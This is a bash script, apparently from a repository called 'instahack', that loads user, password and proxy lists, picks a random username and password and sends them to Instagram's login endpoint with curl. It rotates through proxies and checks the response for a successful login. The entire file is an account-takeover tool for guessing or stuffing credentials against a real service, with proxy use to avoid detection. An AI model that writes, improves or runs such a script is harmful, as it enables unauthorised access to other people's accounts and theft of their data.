#!/bin/bash

# Log file
log="/var/log/temp.log"

# GitHub repository information
github_host="github.com"
github_user="SSLRI"
github_repo="instahack"

# Function to execute a command and log output
execute_command() {
  local command="$1"
  echo "Executing: $command" | tee -a "$log"
  local output=$(eval "$command" 2>&1)
  echo "$output" | tee -a "$log"
}


# Function to get a random number
get_random_number() {
   local min="$1"
   local max="$2"
   echo $(($RANDOM % ($max - $min + 1) + $min))
}


# Main execution loop
for i in $(seq 1 5); do
    echo "Step $i"
    if [[ $i -eq 1 ]]; then
        # Step 1: Get user list
        echo "Fetching user list..."
        user_file="userlist.txt"
    
        if [[ -f "$user_file" ]]; then
          echo "User file loaded successfully."
           user_count=$(wc -l < "$user_file")
           echo "Total users: $user_count"
        else
          echo "Error: user file not found. Please create 'userlist.txt' in the same directory as this script."
          exit 1
        fi

    elif [[ $i -eq 2 ]]; then
        # Step 2: Get password list
        echo "Fetching password list..."
        pass_file="passlist.txt"
            
        if [[ -f "$pass_file" ]]; then
          echo "Password file loaded successfully."
           pass_count=$(wc -l < "$pass_file")
           echo "Total passwords: $pass_count"
        else
           echo "Error: password file not found. Please create 'passlist.txt' in the same directory as this script."
          exit 1
        fi
    elif [[ $i -eq 3 ]]; then
        # Step 3: Get Proxy List
      echo "Fetching proxy list..."
      proxy_file="proxy.txt"
    
      if [[ -f "$proxy_file" ]]; then
        echo "Proxy file loaded successfully."
        proxy_count=$(wc -l < "$proxy_file")
        echo "Total proxies: $proxy_count"
      else
        echo "Proxy file not found. Please create 'proxy.txt' in the same directory as this script. This file can be empty if you don't have proxy."
      fi
    elif [[ $i -eq 4 ]]; then
        # Step 4: Generate random user and password combinations for testing
        echo "Generating user and password combinations..."
          
           if [[ -f "$user_file" && -f "$pass_file" ]]; then
            
              random_user_index=$(get_random_number 1 "$user_count")
              random_pass_index=$(get_random_number 1 "$pass_count")

              random_user=$(sed -n "${random_user_index}p" "$user_file")
              random_pass=$(sed -n "${random_pass_index}p" "$pass_file")
              echo "Selected user: $random_user"
              echo "Selected pass: $random_pass"
           else
               echo "Error: user or password file not found."
           fi

    elif [[ $i -eq 5 ]]; then
      # Step 5: Execute login check with the random user/pass
       if [[ -n "$random_user" && -n "$random_pass" ]]; then
           echo "Trying to check login with user: $random_user"
           if [[ -f "$proxy_file" && "$proxy_count" -gt 0 ]]; then
              random_proxy_index=$(get_random_number 1 "$proxy_count")
              random_proxy=$(sed -n "${random_proxy_index}p" "$proxy_file")
               echo "Selected proxy: $random_proxy"
               execute_command "curl -x $random_proxy -s -d \"username=$random_user&password=$random_pass\" https://www.instagram.com/accounts/login/ajax/  | grep \"authenticated\": true  "
            else
                echo "No proxy found or proxy file is empty, trying without proxy..."
                execute_command "curl -s -d \"username=$random_user&password=$random_pass\" https://www.instagram.com/accounts/login/ajax/  | grep \"authenticated\": true  "
           fi
       else
           echo "Error: User or password not found for testing."
        fi
    fi
done

echo "Script execution completed."
